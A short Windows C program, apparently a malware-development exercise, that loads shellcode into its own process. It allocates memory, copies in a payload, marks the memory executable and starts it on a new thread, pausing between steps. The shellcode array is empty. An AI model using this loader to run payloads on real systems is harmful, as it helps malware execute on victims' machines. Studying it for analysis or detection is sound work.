#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>




BOOL executingshellocdecurrentprocess();

int main() {
	
	unsigned char shellcode[] = { 

	};
	unsigned char* ppayload = shellcode;
	SIZE_T spayload = sizeof(shellcode);

	executingshellocdecurrentprocess(spayload, ppayload);


	printf("press enter to exit");
	getchar();

}
BOOL executingshellocdecurrentprocess(SIZE_T spayload,unsigned char* ppayload) {



	LPVOID pvirtualaddress = VirtualAlloc(NULL, spayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD oldprotection = NULL;

	if (pvirtualaddress == NULL) {
		printf("the virtual alloc failed with error %d", GetLastError());

	}
	printf("virtual memory allocated at %p\n", pvirtualaddress);

	printf("press enter to proceed the transfer of payload");
	getchar();

	memcpy(pvirtualaddress, ppayload, spayload);
	memset(ppayload, 0, spayload);

	if (VirtualProtect(pvirtualaddress, spayload, PAGE_EXECUTE, &oldprotection) == 0) {
		printf("the virtual protect failed with error no %d", GetLastError());
	}


	printf("press enter to run");
	getchar();

	HANDLE hthread = CreateThread(NULL, NULL, pvirtualaddress, NULL, NULL, NULL);

	

	


	  


}




